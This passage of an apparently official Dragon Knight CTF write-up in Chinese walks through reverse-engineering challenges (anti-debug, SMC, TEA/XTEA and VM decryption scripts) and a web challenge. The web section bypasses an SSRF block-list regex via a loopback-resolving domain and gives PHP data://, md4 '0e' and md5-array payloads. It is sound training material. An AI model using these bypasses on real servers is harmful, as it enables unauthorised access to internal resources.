4];</span><br><span class="line"></span><br><span class="line">			*c[0] -= ((e ^ *c[3]) ^ (key[j % 4] &lt;&lt; 2)) ^ (e &gt;&gt; 3);</span><br><span class="line">			e -= delta[*c[0] % 4];</span><br><span class="line">		&#125;</span><br><span class="line">		//printf(&quot;\n0x%x 0x%x 0x%x 0x%x\n&quot;, *c[0], *c[1], *c[2], *c[3]);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;%s&quot;, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">	uint32_t E = 0;</span><br><span class="line">	uint32_t k1[4] = &#123; 0x1234,0x2341,0x3412,0x4123 &#125;;</span><br><span class="line">	uint32_t a[] = &#123; 0x127DC4E1, 0xCBA0EC0E, 0x570EDF5B, 0x99062A35, 0x382A7E1B, 0x15E46742, 0x4E5E456F, 0x3834C1D6, 0x5EF778A5, 0xAF217212, 0xC2D79D20, 0xD5C5935F, 0xCD2F5BB, 0xC527398C, 0x5EAC6739 &#125;;</span><br><span class="line">	E = 0xAE58570C;</span><br><span class="line">	dectrueTEA(a, k1, E);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a><strong>Debug</strong></h3><p>先是一个upx壳，用x64dbg自带的scylla工具脱一下<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733834889-d2f79779-6dec-408a-b3e4-58c0465f6c83.png" alt="image.png"><br>然后得到dump_SYC.exe拖进ida动态分析<br>在main函数开始之前藏了两个IsDebuggerPresent进行反调试<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733834462-d9ba01d4-e5b5-4a90-b31e-000384060a74.png" alt="image.png"><br>之后在函数的开始和结尾部分也利用了GetTickCount函数判断程序是否执行的很慢，如果程序执行的很慢则就是在调试，退出程序<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733836932-af846bc4-b9c5-464a-a148-496084c1a310.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733836945-9a11b118-f1c4-4e1c-b6d1-885c1daaa5e0.png" alt="image.png"><br>题目通过读取当前目录下的myflag.txt中的flag来检验flag，过掉反调试动调到这里可以发现被解密后的 文件名称即myflag.txt<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733836939-ca86b753-0f9a-4528-bbf7-8cf0925cd6df.png" alt="image.png"><br>之后进入main2函数，函数利用了SMC，解密加密代码，再对读取的flag进行加密<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733837016-3584b698-44ce-424f-8b3e-6af0c1623fe0.png" alt="image.png"><br>这里也放有检测时间间隔的反调试函数。<br>一种方法是过掉所有反调试，动调到SMC后面即可看到正确的程序逻辑<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733836937-e47c82bb-164e-45ff-8475-097e53da8e50.png" alt="image.png"><br>但是也可以看明白汇编逻辑后，手动修改回来这段SMC代码贴回去<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733839814-5886117d-4491-47c3-b303-eb86cd60ed66.png" alt="image.png"><br>最后一个函数就是比较函数了<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733839735-3a287912-d13b-4268-9a0e-70dc549aa744.png" alt="image.png"><br>加密过程很简单，取出密文写出解密脚本即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enc = [0xCF, 0xD9, 0xC0, 0xC8, 0xDF, 0xCD, 0x0C, 0xD2, 0x43, 0x98, 0x10, 0xC0, 0x83, 0x43, 0x9A, 0x10, 0xCD, 0x42, 0x8C, 0x4A, 0x10, 0xC8, 0x82, 0x83, 0x4A, 0x9F, 0x8C, 0xDF, 0x98, 0x42, 0x8C, 0xDF, 0x84, 0x82, 0x83, 0x46, 0x52, 0x52, 0x52, 0x0E]</span><br><span class="line"></span><br><span class="line">for i in range(len(enc)):</span><br><span class="line">    tmp = enc[i]</span><br><span class="line">    if (tmp^0xab) &gt; 96 and (tmp^0xab) &lt; 123:</span><br><span class="line">        enc[i] ^= 0xab</span><br><span class="line">        enc[i] -= 32</span><br><span class="line">    elif (tmp^0xcd) &gt; 64 and (tmp^0xcd) &lt; 91:</span><br><span class="line">        enc[i] ^= 0xcd</span><br><span class="line">        enc[i] += 32</span><br><span class="line">    else:</span><br><span class="line">        enc[i] ^= 0x51</span><br><span class="line">        enc[i] += 30</span><br><span class="line">    print(chr(enc[i]), end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>

<p>flag： DRKCTF{Y0u_Kn0w_F1a9_Con9raTu1aTion5!!!}</p>
<h3 id="一起做杯下午茶吧"><a href="#一起做杯下午茶吧" class="headerlink" title="一起做杯下午茶吧"></a><strong>一起做杯下午茶吧</strong></h3><h4 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a><strong>题目考点</strong></h4><p>基础花指令，基础反调试，tea ，xtea，vm</p>
<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a><strong>题解</strong></h4><p>打开题目<br>运行exe<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733839780-6b013b3d-5c54-4149-b476-42de35c957f2.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733839931-34cd7cb6-1557-4b4b-ad87-7864c394fc2c.png" alt="image.png"></p>
<h5 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a><strong>第一关</strong></h5><p>爆红 发现花指令（3处花）很简单的花 直接去<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733839790-1b827b85-7947-4ef6-b9e8-bf9b8a581740.png" alt="image.png"><br>tab进去 发现这道题有两部分<br>先解第一部分，就是一个最基础的tea加密，但是长得有点丑了，改一下名称，<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733842830-f058a447-e0ad-4b7e-ab3b-a377ec6a1906.png" alt="image.png"><br>最终的比较数据<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733842836-429b8bc4-a1db-49ed-a4b0-0624bb5484c1.png" alt="image.png"><br>注意key的反调试相关操作<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733842848-4e225642-e33f-42da-93b2-42467c0b4695.png" alt="image.png"><br>正常没有调试的时候，异或的是key0和key3<br>所以写脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">void decrypt(uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0 = v[0], v1 = v[1], i;</span><br><span class="line">    uint32_t delta = 0x61C88647;</span><br><span class="line">    uint32_t sum = delta * (-32);</span><br><span class="line">    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];</span><br><span class="line">    for (i = 0; i &lt; 32; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);</span><br><span class="line">        sum += delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[0] = v0; v[1] = v1;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    uint32_t enflag [4] = &#123;0xe882d112,0xea66ea40,0xff171fde,0x2a510d08,&#125;;</span><br><span class="line">    uint32_t key[4] = &#123; 0x67626463, 0x696D616E, 0x79645F65, 0x6B696C69 &#125;;</span><br><span class="line">    key[0] ^= 10;</span><br><span class="line">    key[3] ^= 10;</span><br><span class="line">    for (int i = 0; i &lt; 4; i += 2)</span><br><span class="line">    &#123;</span><br><span class="line">        decrypt(enflag + i, key);</span><br><span class="line">        printf(&quot;0x%x,0x%x,&quot;, enflag[i], enflag[i + 1]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n%s&quot;,enflag);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一部分密钥，这个会运用到第二部分的密钥<br>put_some_sugar!!</p>
<h5 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a><strong>第二关</strong></h5><p>通过check找到最终的密文<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733842769-0af381ce-caa5-4a00-9036-a64f03dd8be4.png" alt="image.png"><br>进入加密的主要部分<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733843030-7079f43d-9a10-4165-b4a0-7440229558e9.png" alt="image.png"><br>进去看可以看出来是vm题型，有相关的函数和opcode<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733846267-24cbc91c-948e-46f2-8ffe-b46052c8f318.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733846249-dbabc519-833c-4a95-9e5c-57f972e6cb78.png" alt="image.png"><br>可以看出来规律 0xF开头的是定义的不同函数，根据vm做题经验，我们直接自动化把这个opcode一行一行列出来，然后就是翻译他每个函数的意义了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned char vm_code[] = &#123; </span><br><span class="line">    0xf0,0xe0,0x05,0x4D, </span><br><span class="line">    0xf0,0xe0,0x04,0x00, </span><br><span class="line">    0xf0,0xe0,0x03,0x00, </span><br><span class="line">    0xf3,0xcc,           </span><br><span class="line">    0xf0,0xe0,0x06,0x01,  </span><br><span class="line">    0xf9,0xe0,0x00,0x00,  </span><br><span class="line">    0xf0,0xe0,0x06,0x05, </span><br><span class="line">    0xf5,0x00,0x06,      </span><br><span class="line">    0xf0,0xe1,0x01,0x00, </span><br><span class="line">    0xf0,0xe0,0x06,0x01,</span><br><span class="line">    0xf9,0xe0,0x00,0x00,</span><br><span class="line">    0xf0,0xe0,0x06,0x06,</span><br><span class="line">    0xf6,0x00,0x06,    </span><br><span class="line">    0xf7,0x01,0x00,     </span><br><span class="line">    0xf0,0xe0,0x06,0x01,</span><br><span class="line">    0xf9,0xe0,0x00,0x00, </span><br><span class="line">    0xf1,0x00,0x01,  </span><br><span class="line">    0xf0,0xe1,0x07,0x00 ,    </span><br><span class="line">    0xf0,0xe1,0x00,0x04,   </span><br><span class="line">    0xf0,0xe0,0x06,0x03,  </span><br><span class="line">    0xf8,0x06,0x00,        </span><br><span class="line">    0xf9,0xe0,0x00,0x01,  </span><br><span class="line"></span><br><span class="line">    0xf1,0x00,0x04,     </span><br><span class="line">    0xf7,0x07,0x00,  </span><br><span class="line">    0xf0,0xe0,0x06,0x00,</span><br><span class="line">    0xf9,0xe0,0x00,0x00, </span><br><span class="line">    0xf1,0x00,0x07,</span><br><span class="line">    0xf0,0xe0,0x06,0x00,</span><br><span class="line">    0xf9,0xe1,0x00,0x00, </span><br><span class="line">    0xf0,0xe0,0x06,0x00, </span><br><span class="line">    0xf9,0xe0,0x02,0x02,  </span><br><span class="line">    0xf2,0x04,0x02, </span><br><span class="line">    0xf0,0xe0,0x06,0x00,  </span><br><span class="line">    0xf9,0xe0,0x00,0x00, </span><br><span class="line">    0xf0,0xe0,0x06,0x05, </span><br><span class="line">    0xf5,0x00,0x06,     </span><br><span class="line">    0xf0,0xe1,0x01,0x00, </span><br><span class="line">    0xf0,0xe0,0x06,0x00,</span><br><span class="line">    0xf9,0xe0,0x00,0x00,</span><br><span class="line">    0xf0,0xe0,0x06,0x06,</span><br><span class="line">    0xf6,0x00,0x06,    </span><br><span class="line">    0xf7,0x01,0x00,    </span><br><span class="line">    0xf0,0xe0,0x06,0x00,</span><br><span class="line">    0xf9,0xe0,0x00,0x00,</span><br><span class="line">    0xf1,0x00,0x01,      </span><br><span class="line">    0xf0,0xe1,0x07,0x00,      </span><br><span class="line">    0xf0,0xe1,0x00,0x04,   </span><br><span class="line">    0xf0,0xe0,0x06,0x07,</span><br><span class="line">    0xf6,0x00,0x06, </span><br><span class="line">    0xf0,0xe0,0x06,0x03,   </span><br><span class="line">    0xf8,0x06,0x00,        </span><br><span class="line">    0xf9,0xe0,0x00,0x01,  </span><br><span class="line">    0xf1,0x00,0x04,     </span><br><span class="line">    0xf7,0x07,0x00,    </span><br><span class="line">    0xf0,0xe0,0x06,0x01, </span><br><span class="line">    0xf9,0xe0,0x00,0x00, </span><br><span class="line">    0xf1,0x00,0x07,</span><br><span class="line">    0xf0,0xe0,0x06,0x01,</span><br><span class="line">    0xf9,0xe1,0x00,0x00,</span><br><span class="line">    0xf0,0xe0,0x06,0x01,</span><br><span class="line">    0xf1,0x03,0x06,   </span><br><span class="line">    0xfa,0x03,0x05,   </span><br><span class="line">    0xf4,0xd4,</span><br><span class="line">    0xfb&#125;;</span><br></pre></td></tr></table></figure>

<p>F0 中 不难看出有两种操作，一个是E0 一个是E1<br>先去分析这个vm的相关储存结构是怎么构成的<br>根据不同函数的共同参数a1，并且都在最后加了一定的数值，结合opcode，判断出a1就是栈指针eip<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733846201-7ad18d4b-69f0-4976-a8e5-453b1064ed89.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733845979-34b7ee52-d334-451f-9c91-d015286b8420.png" alt="image.png"><br>结合第一条机器码语句<br>0xf0,0xe0,0x05,0x4D,<br>这里选择了 f0 e0 然后一个小数5 一个大数0X4D，大胆猜测这个就是MOV指令，把0x4D的值存到了5寄存器中<br>谨慎验证 动调<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733845866-2b5f70db-af2b-4237-afb6-d5dcdccc79d2.png" alt="image.png"><br>v1[0]现在指向了F0 那么顺延下去，v1[1]就是E0 进行了类型的选择，v[2]v[3]进行了数据的储存，验证成功，去看别的函数<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733849037-6bb544c8-5d1a-4d39-88c0-414519545eee.png" alt="image.png"><br>这个v2赋值的数据，我们步步跟进，可以分析出是存储寄存器的地址<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733849058-1fdd0f51-2a38-43cb-be1d-412e6bdec991.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733849187-8ac035cc-8034-459e-99ed-3d47a0716c51.png" alt="image.png"><br>这里存了0<br>我们直观去看opcode 不太容易分析出 我们的加密的数据到底在哪，这就涉及另一个函数了<br>在这个函数中涉及了新的数据（我重命名为data_address）我们跟进去看<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733849240-58e21dca-bfb7-4ba0-ab07-2565a0ed05cc.png" alt="image.png"><br>竟然存着我们输入的数据sugar和flag[0]（flag0是我们在外层函数中，发现了类似tea加密的数据循环存储形式，推断出他是进去加密的flag[0],flag[1]结构）<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733849047-f560baea-fb80-4e9b-af9a-474d4e60fce4.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733852794-5ba82270-ab06-4fcb-a964-26a6454ee382.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733852939-8c6a76cc-4fa8-4642-b248-54554c27ede5.png" alt="image.png"><br>第三个unknown跟进，发现是114514，感觉是delta，<br>这个三个部分分别占据了data_address的1 2 3位，找一句执行0XF9的语句进行大胆分析<br>0xf9,0xe0,0x00,0x00,<br>选择e0方式，两个0，第一个0代表了寄存器型号的选择，第二个0代表了data_address中 三个地址的选择，这里明显就是选择了flag，然后将值存入了0寄存器中，<br>后面的eip[6]是干啥的，明显是以flag第一位为索引，去看具体取数组中的第几位，跟进上一个语句<br>0xf0,0xe0,0x06,0x01, mov了一个1进6寄存器，这里就是说取了flag+1指针所指向的值 即flag[1]<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733852817-f2adebc3-cd13-42a6-9e0f-2038ce8cdbc6.png" alt="image.png"><br>一些加减乘除位移异或的函数分析就不做具体分析了，jmp和cmp的汇编有经验的师傅们应该也很容易识别出<br>最后的函数命名如下<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733853125-6edf951b-838f-4ae1-867c-906653ff1634.png" alt="image.png"><br>我们就可以依据这个写出汇编，思路其实就是一个XTEA的加密（看出XTEA因为其中有一句对于key取位的操作）<br>delta和密文密钥我们都有了，注意这里的循环次数进行了魔改是4D，原opcode的注释呈上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned char vm_code[] = &#123; </span><br><span class="line">	0xf0,0xe0,0x05,0x4D, //存rounds进r6   r6代表rounds 基本不会变的</span><br><span class="line">	0xf0,0xe0,0x04,0x00, //存sum进r5  r5代表sum</span><br><span class="line">	0xf0,0xe0,0x03,0x00, //存i进r4   (这三个固定的值)</span><br><span class="line"></span><br><span class="line">	0xf3,0xcc,            //jump到for循环</span><br><span class="line">	0xf0,0xe0,0x06,0x01,  //temp临时存了0x01</span><br><span class="line">	0xf9,0xe0,0x00,0x00,  //取了flag中的第一个数（目前的v1）</span><br><span class="line">	0xf0,0xe0,0x06,0x05,  //temp临时存值0x05</span><br><span class="line">	0xf5,0x00,0x06,       //shl操作</span><br><span class="line">	0xf0,0xe1,0x01,0x00,  //位操作完成的值给到r2中</span><br><span class="line">	0xf0,0xe0,0x06,0x01,</span><br><span class="line">	0xf9,0xe0,0x00,0x00,</span><br><span class="line">	0xf0,0xe0,0x06,0x06,</span><br><span class="line">	0xf6,0x00,0x06,     //shr操作</span><br><span class="line">	0xf7,0x01,0x00,     //异或之后的值存在了寄存器r2中</span><br><span class="line">	0xf0,0xe0,0x06,0x01,</span><br><span class="line">	0xf9,0xe0,0x00,0x00, //又把v1存在了r1中</span><br><span class="line">	0xf1,0x00,0x01,      //把r1和r2相加  实现了 (((v1 &gt;&gt; 5) ^ (v1 &gt;&gt; 6)) + v1) 这段数据在r1中</span><br><span class="line">	0xf0,0xe1,0x07,0x00 ,      //先放在临时储存的地方</span><br><span class="line">	//现在的问题，怎么把算好的这部分数据存到一个地方。</span><br><span class="line">	0xf0,0xe1,0x00,0x04,   //把sum的值移动到r1中</span><br><span class="line">	0xf0,0xe0,0x06,0x03,   //存到temp中3</span><br><span class="line">	0xf8,0x06,0x00,        //进行与运算，存到r1中 这个就是我们现在的索引值</span><br><span class="line"></span><br><span class="line">	0xf9,0xe0,0x00,0x01,  //使用lea 这里将key[sum&amp;3]存到r1中</span><br><span class="line">	0xf1,0x00,0x04,      //再次把sum加上r1 实现了(key[sum &amp; 3] + sum)</span><br><span class="line">	//开始异或最后一步</span><br><span class="line">	0xf7,0x07,0x00,     //把两者异或的结果存储在store寄存器中 实现了语句 (((v1 &gt;&gt; 5) ^ (16 * v1)) + v1) ^ (key[sum &amp; 3] + sum);</span><br><span class="line">	//把上面store的值加上v0 下次循环还要用</span><br><span class="line">	0xf0,0xe0,0x06,0x00, //temp存0</span><br><span class="line">	0xf9,0xe0,0x00,0x00, //索引flag[0]放进r1</span><br><span class="line">	0xf1,0x00,0x07,//全新的flag[0]存在了r1中，再使用lea把数值存到flag[0]里</span><br><span class="line"></span><br><span class="line">	0xf0,0xe0,0x06,0x00,</span><br><span class="line">	0xf9,0xe1,0x00,0x00, //这里成功把全新的v0存到了flag[0]的位置，以便于下一步的引用</span><br><span class="line"></span><br><span class="line">	// sum -= 1640531527; 实现这一步</span><br><span class="line"></span><br><span class="line">   //存一下delta试试   delta只会在里面用到一次</span><br><span class="line">   0xf0,0xe0,0x06,0x00,  //temp寄存器先保存一下取第几位的值</span><br><span class="line">   0xf9,0xe0,0x02,0x02,  //现在寄存器r3存储了delta的值</span><br><span class="line">   0xf2,0x04,0x02, //实现了sum-=delta</span><br><span class="line"></span><br><span class="line">	//最后一步 v1 += (((v0 &gt;&gt; 5) ^ (16 * v0)) + v0) ^ (key[(sum &gt;&gt; 11) &amp; 3] + sum);</span><br><span class="line"></span><br><span class="line">	0xf0,0xe0,0x06,0x00,  //temp临时存了0x00</span><br><span class="line">	0xf9,0xe0,0x00,0x00,  //取了flag中的第一个数（目前的v0）</span><br><span class="line">	0xf0,0xe0,0x06,0x05,  //temp临时存值0x05</span><br><span class="line">	0xf5,0x00,0x06,       //shl操作</span><br><span class="line">	0xf0,0xe1,0x01,0x00,  //位操作完成的值给到r2中</span><br><span class="line">	0xf0,0xe0,0x06,0x00,</span><br><span class="line">	0xf9,0xe0,0x00,0x00,</span><br><span class="line">	0xf0,0xe0,0x06,0x06,</span><br><span class="line">	0xf6,0x00,0x06,     //shr操作</span><br><span class="line">	0xf7,0x01,0x00,     //异或之后的值存在了寄存器r2中</span><br><span class="line">	0xf0,0xe0,0x06,0x00,</span><br><span class="line">	0xf9,0xe0,0x00,0x00, //又把v0存在了r1中</span><br><span class="line">	0xf1,0x00,0x01,      //把r1和r2相加  实现了 (((v0 &gt;&gt; 5) ^ (v0 &gt;&gt; 6)) + v0) 这段数据在r1中</span><br><span class="line">	0xf0,0xe1,0x07,0x00,      //先放在临时储存的地方</span><br><span class="line"></span><br><span class="line">	0xf0,0xe1,0x00,0x04,   //把sum的值移动到r1中 进行右移7的操作</span><br><span class="line">	0xf0,0xe0,0x06,0x07,</span><br><span class="line">	0xf6,0x00,0x06, //进行了sum&gt;&gt;7的操作，存在了r1中</span><br><span class="line">	0xf0,0xe0,0x06,0x03,   //存到temp中3</span><br><span class="line">	0xf8,0x06,0x00,        //进行与运算，存到r1中 这个就是我们现在的索引值</span><br><span class="line"></span><br><span class="line">	0xf9,0xe0,0x00,0x01,  //使用lea 这里将key[(sum&gt;&gt;7)&amp;3]存到r1中</span><br><span class="line">	0xf1,0x00,0x04,      //再次把sum加上r1 实现了(key[sum &amp; 3] + sum)</span><br><span class="line">	//开始异或最后一步</span><br><span class="line">	0xf7,0x07,0x00,     //把两者异或的结果存储在store寄存器中 实现了语句 (((v1 &gt;&gt; 5) ^ (16 * v1)) + v1) ^ (key[sum &amp; 3] + sum);</span><br><span class="line">	//把上面store的值加上v0 下次循环还要用</span><br><span class="line">	0xf0,0xe0,0x06,0x01, //temp存1</span><br><span class="line">	0xf9,0xe0,0x00,0x00, //索引flag[1]放进r1</span><br><span class="line">	0xf1,0x00,0x07,//全新的flag[1]存在了r1中，再使用lea把数值存到flag[1]里</span><br><span class="line"></span><br><span class="line">	0xf0,0xe0,0x06,0x01,</span><br><span class="line">	0xf9,0xe1,0x00,0x00,</span><br><span class="line"></span><br><span class="line">	0xf0,0xe0,0x06,0x01,</span><br><span class="line">	0xf1,0x03,0x06,    //i++操作</span><br><span class="line">	0xfa,0x03,0x05,    //cmp比较rounds和i  for循环</span><br><span class="line">	0xf4,0xd4,</span><br><span class="line">	0xfb&#125;;</span><br></pre></td></tr></table></figure>

<p>写出XTEA解密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">void decipher(unsigned int num_rounds, uint32_t* v, uint32_t const* key) &#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    uint32_t v0 = v[0], v1 = v[1], delta = 0x114514, sum = delta * (-77);</span><br><span class="line">    for (i = 0; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; 5) ^ (v0 &gt;&gt; 6)) + v0) ^ (sum + key[(sum &gt;&gt; 7) &amp; 3]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; 5) ^ (v1 &gt;&gt; 6)) + v1) ^ (sum + key[sum &amp; 3]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[0] = v0; v[1] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    unsigned char* key = &quot;put_some_sugar!!&quot;;</span><br><span class="line">    uint32_t const* k = key;</span><br><span class="line">    uint32_t v[] = &#123; 0xd5bf7cb6, 0x1cc08fa5, 0x80d48de8, 0x6c3f5f0, 0x7e484457, 0xbfaeb3a6, 0xb44a2a23, 0x3ebb5b15, &#125;;</span><br><span class="line">    unsigned int r = 0x4D;</span><br><span class="line">    for (int i = 0; i &lt; 8; i += 2)</span><br><span class="line">    &#123;</span><br><span class="line">        decipher(r, v + i, k);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;解密后的数据:\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; 8; i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        printf(&quot;0x%x, &quot;, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    printf(&quot; %s&quot;, v);</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733852921-f2ede4a7-c5b0-4bfe-8e28-2943c3243cd8.png" alt="image.png"><br>得到最终的flag<br>DRKCTF{Y0ur_t3a_te4sT_NoT_b4d!!}</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h3 id="穿梭隐藏的密钥"><a href="#穿梭隐藏的密钥" class="headerlink" title="穿梭隐藏的密钥"></a><strong>穿梭隐藏的密钥</strong></h3><p>源码发现路由<br>访问路由&#x2F;c3s4f.php<br>参数爆破，得到参数shell<br>需要本地才能实现文件读取<br>开始ssrf伪造<br>但是过滤了gopher，127，@，0等,以下是正则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;/ftp|ftps|gopher|telnet|dict|file|ldap|@|127|0|[|localhost|https/i&#x27;</span><br></pre></td></tr></table></figure>

<p>这里可以用302跳转或者域名解析IP绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo.cc指向IP地址127.0.0.1。A记录就是域名指向ip地址，然后可以通过A记录转向访问</span><br><span class="line">类似的还有safe.taobao.com，114.taobao.com，test.xiaodi8.com等</span><br></pre></td></tr></table></figure>

<p>故构造如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?shell=http://sudo.cc/</span><br></pre></td></tr></table></figure>

<p>发现回到了首页，跨越成功<br>但是要求是秘密只给127.0.0.1<br>猜测为secret.php(或者扫目录)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?shell=http://sudo.cc/secret.php</span><br></pre></td></tr></table></figure>

<p>拿到key ,这里的key值是DrKn的参数和cha11eng3.php路由<br>challenge1:<br>需要绕过file_get_contents()函数<br>用data:&#x2F;&#x2F;伪协议绕过<br>所以第一部分payload: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cha11eng3.php?DrKn=data://text/plain,MSIBLG</span><br></pre></td></tr></table></figure>

<p>challenge2:<br>关键代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hash(&quot;md4&quot;, $damei) == $damei</span><br></pre></td></tr></table></figure>

<p>传入的值被md4加密后跟原来的相等<br>利用php的松散性绕过，也就是0e</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">初始值:  0e001233333333333334557778889</span><br><span class="line">md4 hash  :  0e434041524824285414215559233446</span><br><span class="line">初始值:  0e00000111222333333666788888889</span><br><span class="line">md4 hash  :  0e434041524824285414215559233446</span><br></pre></td></tr></table></figure>

<p>php非法传参<br>在给参数传值时，如果参数名中存在非法字符，比如空格和点，则参数名中的点和空格等非法字符都会被替换成下划线。<br>并且，在PHP8之前，如果参数中出现中括号[，那么中括号会被转换成下划线_，但是会出现转换错误，导致如果参数名后面还存在非法字符，则不会继续转换成下划线。也就是说，我们可以刻意拼接中括号制造这种错误，来保留后面的非法字符不被替换，因为中括号导致只会替换一次。<br>第二部分payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cha11eng3.php?DrKn=data://text/plain,MSIBLG&amp;M[ore.8=0e001233333333333334557778889</span><br></pre></td></tr></table></figure>

<p>challenge3:<br>md5针对强类型逻辑比较绕过，同弱类型逻辑比较中利用php特性MD5处理数组默认返回Null进行绕过手法<br>（Null类型强(弱)等于Null类型）<br>第三部分payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get传参：</span><br><span class="line">/cha11eng3.php?DrKn=data://text/plain,MSIBLG&amp;M[ore.8=0e001233333333333334557778889</span><br><span class="line">post传参：</span><br><span class="line">wtf[]=11&amp;mC[]=1</span><br><span class="line">或者</span><br><span class="line">直接post传参</span><br></pre></td></tr></table></figure>

